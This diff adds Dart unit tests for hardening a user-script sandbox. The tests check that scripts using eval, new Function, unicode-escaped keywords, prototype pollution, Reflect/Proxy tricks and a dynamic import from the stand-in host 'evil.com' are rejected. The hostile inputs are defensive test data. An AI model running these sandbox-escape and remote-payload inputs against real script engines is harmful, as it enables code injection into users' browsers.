@@ -169,4 +169,88 @@ void main() {
     expect(js, contains('xdm_user_script_bad_id_with_special_chars'));
     await manager.clear();
   });
+
+  group('UserScript Sandbox Hardening (Fix 5)', () {
+    test('rejects eval, new Function, and dynamic imports', () async {
+      final manager = UserScriptManager.instance;
+      await manager.load();
+
+      expect(
+        () => manager.add(script0(code: 'eval("alert(1)")')),
+        throwsA(isA<Exception>()),
+      );
+      expect(
+        () => manager.add(script0(code: 'const f = new Function("alert(1)")')),
+        throwsA(isA<Exception>()),
+      );
+      expect(
+        () => manager.add(script0(code: 'import("http://evil.com/payload.js")')),
+        throwsA(isA<Exception>()),
+      );
+    });
+
+    test('rejects unicode-escaped keywords like \\u0065val and \\u0046unction', () async {
+      final manager = UserScriptManager.instance;
+      await manager.load();
+
+      expect(
+        () => manager.add(script0(code: r'\u0065val("alert(1)")')),
+        throwsA(isA<Exception>()),
+      );
+      expect(
+        () => manager.add(script0(code: r'new \u0046unction("alert(1)")')),
+        throwsA(isA<Exception>()),
+      );
+    });
+
+    test('rejects prototype pollution attempts', () async {
+      final manager = UserScriptManager.instance;
+      await manager.load();
+
+      expect(
+        () => manager.add(script0(code: 'Object.prototype.isAdmin = true;')),
+        throwsA(isA<Exception>()),
+      );
+      expect(
+        () => manager.add(script0(code: '({}).__proto__.polluted = true;')),
+        throwsA(isA<Exception>()),
+      );
+      expect(
+        () => manager.add(script0(code: 'const p = Object.getPrototypeOf({});')),
+        throwsA(isA<Exception>()),
+      );
+    });
+
+    test('rejects Reflect and Proxy bypasses', () async {
+      final manager = UserScriptManager.instance;
+      await manager.load();
+
+      expect(
+        () => manager.add(script0(code: 'Reflect.construct(Function, ["alert(1)"])')),
+        throwsA(isA<Exception>()),
+      );
+      expect(
+        () => manager.add(script0(code: 'new Proxy({}, {})')),
+        throwsA(isA<Exception>()),
+      );
+    });
+
+    test('generated sandbox wraps in strict IIFE with prototype freezes and 5s timeout', () async {
+      final manager = UserScriptManager.instance;
+      await manager.load();
+      await manager.add(script0(pattern: '*', code: 'console.log("safe script");'));
+
+      final js = await manager.getJsForUrl('https://example.com');
+      expect(js, contains("'use strict'"));
+      expect(js, contains('Object.freeze(Object.prototype)'));
+      expect(js, contains('Object.freeze(Function.prototype)'));
+      expect(js, contains('Object.freeze(Array.prototype)'));
+      expect(js, contains('_sandboxTimeoutMs = 5000'));
+      expect(js, contains('window.eval = function()'));
+      expect(js, contains('window.Function = function()'));
+
+      await manager.clear();
+    });
+  });
 }
+
